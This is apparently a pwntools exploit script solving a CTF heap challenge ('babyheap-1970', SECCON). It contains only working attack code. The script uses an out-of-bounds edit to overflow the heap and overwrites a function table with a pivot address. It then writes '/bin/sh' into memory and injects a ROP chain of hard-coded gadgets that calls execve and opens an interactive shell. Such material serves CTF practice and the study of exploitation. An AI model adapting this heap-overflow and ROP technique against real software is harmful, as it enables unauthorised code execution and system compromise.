from pwn import *
import sys

elf = ELF("chall")
# libc = ELF("libc.so.6")

io = process(elf.path)
# io = remote('babyheap-1970.dom.seccon.games', 9999)

context.log_level = 'info'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io)

# - define functions - #
def realloc(id: int, sz: int):
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"id: ", str(id).encode())
	io.sendlineafter(b"size: ", str(sz).encode())

def edit(id: int, idx: int, val: int):
	io.sendlineafter(b"> ", b"2")
	io.sendlineafter(b"id: ", str(id).encode())
	io.sendlineafter(b"index: ", str(idx).encode())
	io.sendlineafter(b"value: ", str(val).encode())


# - out of bounds -> heap overflow - #
realloc(0, 36)
realloc(1, 36)
edit(0, 36, 0x80f1)
realloc(1, 99)

# - write 0x40117c @ 0x429b0
edit(1, 43, 0x0)
edit(1, 42, 0x0)
edit(1, 41, 0x42)
edit(1, 40, 0xe998)

realloc(2, 36)
realloc(3, 36) # <- func. table

edit(3, 3, 0x0)
edit(3, 2, 0x0)
edit(3, 1, 0x40)
edit(3, 0, 0x117c)

# - set "/bin/sh\x00" - #
edit(3, 7, u16(b"h\x00"))
edit(3, 6, u16(b"/s"))
edit(3, 5, u16(b"in"))
edit(3, 4, u16(b"/b"))


realloc(159, 1) # overwrite g_size[644]

# - ROP chain injection - #
syscall_ret = 0x004018e7
pop_rdi_pop4times_ret = 0x0041f48a
pop_rsi_pop3_ret = 0x0042374e
pop_rax_ret = 0x00413563
binsh_addr = 0x42e9b8

rop_chain = p64(pop_rdi_pop4times_ret)
rop_chain += p64(binsh_addr)
rop_chain += p64(0x0) * 4
rop_chain += p64(pop_rsi_pop3_ret)
rop_chain += p64(0x0) * 4
rop_chain += p64(pop_rax_ret)
rop_chain += p64(0x3b)
rop_chain += p64(syscall_ret)

log.info(f'ROP chain: {len(rop_chain)} bytes')

for i in range(len(rop_chain)//2):
	edit(644, i, u16(rop_chain[2*i:2*i+2]))


# Gooooooo!!!!!
io.sendlineafter(b">", b"-1")

io.interactive()
